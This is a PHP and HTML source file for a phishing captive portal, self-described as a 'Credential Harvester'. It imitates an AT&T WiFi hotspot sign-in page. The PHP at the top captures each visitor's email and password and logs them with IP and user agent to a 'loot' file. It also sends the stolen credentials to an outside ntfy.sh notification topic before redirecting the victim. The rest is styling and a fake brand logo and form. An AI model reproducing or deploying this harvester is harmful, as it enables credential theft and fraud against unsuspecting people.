<?php
// GARMR ATT Portal - Credential Harvester
$loot_file = "/root/loot/garmr/credentials.txt";
$ntfy_topic = trim(@file_get_contents("/root/.garmr_ntfy_topic"));

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $timestamp = date("Y-m-d H:i:s");
    $ip = $_SERVER["REMOTE_ADDR"];
    $ua = $_SERVER["HTTP_USER_AGENT"];
    @mkdir(dirname($loot_file), 0755, true);
    $entry = "[$timestamp] ATT | IP: $ip | Email: $email | Pass: $password | UA: $ua\n";
    file_put_contents($loot_file, $entry, FILE_APPEND | LOCK_EX);
    
    if (!empty($ntfy_topic)) {
        $msg = "📱 AT&T CREDS\n📧 $email\n🔑 $password\n🌐 $ip";
        // PHP native curl (shell_exec unreliable)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ntfy.sh/$ntfy_topic");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $msg);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Title: GARMR Creds", "Priority: high", "Tags: key,rotating_light"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        curl_close($ch);
        
    }
    
    header("Location: /success.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AT&T WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #009FDB 0%, #00629B 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            width: 120px;
            height: 80px;
            margin: 0 auto 20px;
        }
        .logo svg {
            width: 100%;
            height: 100%;
        }
        h1 {
            color: #00629B;
            font-size: 22px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            color: #00629B;
            font-weight: 500;
            margin-bottom: 6px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #009FDB;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #009FDB;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        button:hover {
            background: #00629B;
        }
        .att-info {
            margin-top: 20px;
            padding: 15px;
            background: #E6F4FA;
            border-radius: 8px;
            font-size: 13px;
            color: #00629B;
        }
        .customer-note {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
        }
        .customer-note a {
            color: #009FDB;
            text-decoration: none;
            font-weight: 500;
        }
        .terms {
            margin-top: 20px;
            font-size: 11px;
            color: #999;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 120 80" xmlns="http://www.w3.org/2000/svg">
                <!-- AT&T Globe -->
                <circle cx="60" cy="40" r="35" fill="#009FDB"/>
                <!-- Globe lines -->
                <ellipse cx="60" cy="40" rx="35" ry="15" fill="none" stroke="white" stroke-width="1.5"/>
                <ellipse cx="60" cy="40" rx="20" ry="35" fill="none" stroke="white" stroke-width="1.5"/>
                <line x1="25" y1="40" x2="95" y2="40" stroke="white" stroke-width="1.5"/>
                <line x1="60" y1="5" x2="60" y2="75" stroke="white" stroke-width="1.5"/>
                <!-- AT&T text -->
                <text x="60" y="90" text-anchor="middle" font-family="Arial, sans-serif" font-size="16" font-weight="bold" fill="#00629B">AT&amp;T</text>
            </svg>
        </div>

        <h1>AT&T WiFi Hotspot</h1>
        <p class="subtitle">Sign in with your AT&T account</p>

        <form method="POST" action="">
            <div class="form-group">
                <label for="email">AT&T User ID (Email)</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>

        <div class="att-info">
            <strong>📱 AT&T Customers</strong><br>
            Unlimited data customers get free WiFi hotspot access nationwide.
        </div>

        <p class="customer-note">
            Not an AT&T customer? <a href="#">Learn about our plans</a>
        </p>

        <p class="terms">
            By signing in, you agree to the AT&T Terms of Service
            and AT&T Privacy Policy.
        </p>
    </div>
</body>
</html>
